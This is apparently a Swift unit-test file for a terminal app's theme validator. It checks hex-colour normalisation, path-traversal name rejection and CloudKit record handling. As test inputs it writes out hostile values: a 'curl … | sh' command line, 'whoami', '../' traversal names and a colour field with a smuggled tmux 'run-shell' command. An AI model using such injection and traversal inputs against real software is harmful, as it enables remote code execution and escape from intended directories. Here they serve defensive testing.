import XCTest
import CloudKit
@testable import VVTerm

final class TerminalThemeValidationTests: XCTestCase {
    func testNormalizeHexColorUppercasesAndPrefixesHash() {
        XCTAssertEqual(TerminalThemeValidator.normalizeHexColor("aabbcc"), "#AABBCC")
        XCTAssertEqual(TerminalThemeValidator.normalizeHexColor("#aabbcc"), "#AABBCC")
    }

    func testValidateAndNormalizeThemeContentRequiresBackgroundAndForeground() throws {
        let content = """
        background = #000000
        foreground = #ffffff
        palette = 0=#112233
        """

        let normalized = try TerminalThemeValidator.validateAndNormalizeThemeContent(content)

        XCTAssertEqual(
            normalized,
            """
            background = #000000
            foreground = #FFFFFF
            palette = 0=#112233
            """
            + "\n"
        )
    }

    func testValidateAndNormalizeThemeContentRejectsInvalidPalette() {
        let content = """
        background = #000000
        foreground = #ffffff
        palette = 256=#112233
        """

        XCTAssertThrowsError(try TerminalThemeValidator.validateAndNormalizeThemeContent(content))
    }

    func testLegacyVisualThemeKeysRemainSupported() throws {
        let content = """
        background = #000000
        foreground = #ffffff
        bold-color = #eeeeee
        split-divider-color = #222222
        unfocused-split-fill = #111111
        palette = 255=#abcdef
        palette-generate = true
        palette-harmonious = false
        background-opacity = 0.9
        background-opacity-cells = true
        cursor-opacity = 0.8
        faint-opacity = 0.4
        unfocused-split-opacity = 0.7
        minimum-contrast = 3
        """

        let normalized = try TerminalThemeValidator.validateAndNormalizeThemeContent(content)

        XCTAssertTrue(normalized.contains("bold-color = #EEEEEE"))
        XCTAssertTrue(normalized.contains("palette = 255=#ABCDEF"))
        XCTAssertTrue(normalized.contains("minimum-contrast = 3"))
    }

    func testUnsafeThemeKeepsOriginalContentInRepairState() {
        let original = "background = #000000\nforeground = #ffffff\ncommand = whoami\n"
        let theme = TerminalTheme(name: "Legacy", content: original)

        XCTAssertEqual(theme.validationState, .needsRepair)
        XCTAssertEqual(theme.content, original)
        XCTAssertFalse(theme.canApply)
    }

    func testValidateThemeNameRejectsTraversalAndControlCharacters() {
        for name in ["../Outside", "..\\Outside", ".", "..", "C:theme", "line\nbreak"] {
            XCTAssertThrowsError(try TerminalThemeValidator.validateAndNormalizeThemeName(name))
        }
    }

    func testValidateThemeContentRejectsNonThemeConfiguration() {
        let content = """
        background = #000000
        foreground = #ffffff
        command = curl https://example.invalid | sh
        """

        XCTAssertThrowsError(try TerminalThemeValidator.validateAndNormalizeThemeContent(content))
    }

    func testCloudThemeRejectsUnsafeName() {
        let recordID = CKRecord.ID(recordName: UUID().uuidString)
        let record = CKRecord(recordType: "TerminalTheme", recordID: recordID)
        record["name"] = "../../Outside" as CKRecordValue
        record["content"] = "background = #000000\nforeground = #ffffff\n" as CKRecordValue

        XCTAssertNil(TerminalThemeCloudKitRecordCodec.theme(from: record))
    }

    func testCloudThemePreservesInvalidContentForSafeMergeRejection() throws {
        let recordID = CKRecord.ID(recordName: UUID().uuidString)
        let record = CKRecord(recordType: "TerminalTheme", recordID: recordID)
        let original = "background = #000000\nforeground = #ffffff\ncommand = whoami\n"
        record["name"] = "Existing Theme" as CKRecordValue
        record["content"] = original as CKRecordValue

        let theme = try XCTUnwrap(TerminalThemeCloudKitRecordCodec.theme(from: record))

        XCTAssertEqual(theme.content, original)
        XCTAssertFalse(theme.canApply)
    }

    func testTmuxModeStyleRejectsInjectedColorValue() throws {
        let name = "Security Test \(UUID().uuidString)"
        let directoryURL = TerminalThemeStoragePaths.customThemesDirectoryURL()
        let fileURL = try XCTUnwrap(TerminalThemeStoragePaths.customThemeFileURL(for: name))
        try FileManager.default.createDirectory(at: directoryURL, withIntermediateDirectories: true)
        try """
        background = #000000
        foreground = #112233
        selection-background = #445566\"; run-shell attacker
        """.write(to: fileURL, atomically: true, encoding: .utf8)
        defer {
            try? FileManager.default.removeItem(at: fileURL)
            ThemeColorParser.invalidateCache()
        }
        ThemeColorParser.invalidateCache()

        let style = ThemeColorParser.tmuxModeStyle(for: name)

        XCTAssertEqual(style, "fg=#112233,bg=#45475a")
        XCTAssertFalse(style.contains("run-shell"))
    }
}
